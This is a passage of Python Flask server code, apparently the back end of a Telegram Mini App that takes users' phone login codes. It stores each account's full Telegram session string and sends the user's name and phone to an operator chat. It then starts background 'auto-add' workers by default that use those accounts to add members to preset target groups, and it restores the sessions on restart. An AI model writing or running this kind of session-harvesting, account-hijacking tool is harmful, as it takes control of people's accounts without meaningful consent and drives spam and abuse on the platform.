                me = await client.get_me()
                
                user_telegram_id = str(me.id) if me.id else telegram_id
                
                # Save mapping for future auto-login
                if user_telegram_id:
                    user_phone_map[user_telegram_id] = td['phone']
                    save_user_map()
                    auto_sessions[user_telegram_id] = {
                        'phone': td['phone'],
                        'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                        'username': me.username or '',
                        'last_used': time.time()
                    }
                    save_auto_sessions()
                
                try:
                    account_age = get_account_age_sync(client.session.save())
                except:
                    account_age = {'age_display': 'Unknown'}
                
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'account_age': account_age,
                    'telegram_id': user_telegram_id
                }
                
                if not new_acc['name']:
                    new_acc['name'] = 'User'
                
                # Check for duplicate
                existing = next((a for a in accounts if a.get('telegram_id') == user_telegram_id), None)
                if existing:
                    existing.update(new_acc)
                    save_json(ACCOUNTS_FILE, accounts)
                else:
                    accounts.append(new_acc)
                    save_json(ACCOUNTS_FILE, accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUPS[0],
                    'delay_seconds': 30,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_id)] = {'total': 0, 'today': 0, 'verified_today': 0}
                save_json(STATS_FILE, stats)
                
                threading.Thread(target=start_auto_add, args=(new_acc,), daemon=True).start()
                
                age_info = account_age.get('age_display', 'Unknown')
                try:
                    send_telegram(
                        f"<b>{SERVER_NAME}</b>\n"
                        f"✅ New account added!\n"
                        f"Name: {new_acc['name']}\n"
                        f"Phone: {new_acc['phone']}\n"
                        f"Age: {age_info}\n"
                        f"Via: Telegram Mini App"
                    )
                except:
                    pass
                
                return {
                    'success': True,
                    'account': {
                        'id': new_id,
                        'name': new_acc['name'],
                        'phone': new_acc['phone']
                    },
                    'account_age': age_info,
                    'auto_login_enabled': True
                }
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Please request a new one.'}
            except Exception as e:
                logger.error(f"Verify error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

# Other routes
@app.route('/api/remove-account', methods=['POST'])
@api_error_handler
def remove_account():
    aid = request.json.get('accountId')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    stop_auto_add(aid)
    name = remove_dead_account(aid, "Manual removal")
    return jsonify({'success': True, 'message': f'Removed: {name}'})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
@api_error_handler
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        s = auto_add_settings.get(str(aid), {
            'enabled': False,
            'target_group': TARGET_GROUPS[0],
            'delay_seconds': 30
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    akey = str(aid)
    was_enabled = auto_add_settings.get(akey, {}).get('enabled', False)
    new_enabled = data.get('enabled', False)
    
    auto_add_settings[akey] = {
        'enabled': new_enabled,
        'target_group': data.get('target_group', TARGET_GROUPS[0]),
        'delay_seconds': max(30, data.get('delay_seconds', 30)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if new_enabled and not was_enabled:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    elif not new_enabled and was_enabled:
        stop_auto_add(aid)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
@api_error_handler
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME,
        'active_workers': len(running_tasks)
    })

@app.route('/api/send-report')
@api_error_handler
def send_report():
    success = send_telegram(
        f"<b>{SERVER_NAME}</b> Report\n"
        f"Today: {stats.get('today_added', 0)}\n"
        f"Total: {stats.get('total_added', 0)}\n"
        f"Active Workers: {len(running_tasks)}"
    )
    return jsonify({'success': success})

@app.route('/api/health')
@api_error_handler
def health_check():
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'status': 'healthy',
        'workers': len(running_tasks),
        'accounts': len(accounts),
        'timestamp': datetime.now().isoformat()
    })

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    consecutive_failures = 0
    while True:
        try:
            time.sleep(240)
            try:
                response = requests.get(f"{SERVER_URL}/ping", timeout=10)
                if response.status_code == 200:
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
            except:
                consecutive_failures += 1
            if consecutive_failures > 5:
                logger.critical("Too many keep-alive failures!")
                consecutive_failures = 0
        except Exception as e:
            logger.error(f"Keep alive error: {e}")
            time.sleep(60)

def restore_and_start():
    try:
        time.sleep(5)
        logger.info(f"Restoring {len(accounts)} accounts...")
        for acc in accounts:
            try:
                if acc.get('session'):
                    if check_account_auth(acc):
                        settings = auto_add_settings.get(str(acc['id']), {})
                        if settings.get('enabled', True):
                            start_auto_add(acc)
                    else:
                        remove_dead_account(acc['id'], "Auth check failed on startup")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error restoring account: {e}")
                continue
        save_json(ACCOUNTS_FILE, accounts)
        cleanup_expired_sessions()
        try:
            send_telegram(
                f"<b>{SERVER_NAME}</b> Online!\n"
                f"Workers: {len(running_tasks)}\n"
                f"Accounts: {len(accounts)}\n"
                f"Auto-login users: {len(user_phone_map)}"
            )
        except:
            pass
        logger.info("Server startup complete")
    except Exception as e:
        logger.critical(f"Fatal error during restore: {e}")
        stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
        save_json(STATS_FILE, stats)

def cleanup_expired_sessions():
    try:
        current_time = time.time()
        expired = [sid for sid, data in temp_sessions.items()
                   if current_time - data.get('created_at', 0) > 3600]
        for sid in expired:
            del temp_sessions[sid]
        save_temp_sessions()
    except Exception as e:
        logger.error(f"Session cleanup error: {e}")

def signal_handler(signum, frame):
    logger.info(f"Received signal {signum}, shutting down...")
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(STATS_FILE, stats)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    save_temp_sessions()
    save_auto_sessions()
    save_user_map()
    logger.info("Data saved. Exiting.")
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        accounts.extend(load_json(ACCOUNTS_FILE, []))
        auto_add_settings.update(load_json(SETTINGS_FILE, {}))
        stats_data = load_json(STATS_FILE, {})
        if stats_data:
            stats.update(stats_data)
        worker_adds_data = load_json(WORKER_ADDS_FILE, {})
        if worker_adds_data:
            worker_adds.update(worker_adds_data)
        load_temp_sessions()
        load_auto_sessions()
        load_user_map()
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║     AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME} (TELEGRAM MINI APP)         ║
╠══════════════════════════════════════════════════════════════╣
║  API ID: {API_ID}                                                 ║
║  Targets: {', '.join(TARGET_GROUPS)}                    ║
║  Port: {PORT}                                                   ║
║  Features: Auto-Detect Phone, Code-Only Verification            ║
║  Auto-Login Users: {len(user_phone_map)}                                            ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
        
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
            
    except Exception as e:
        logger.critical(f"Fatal startup error: {e}")
        try:
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
        except:
            pass
        sys.exit(1)
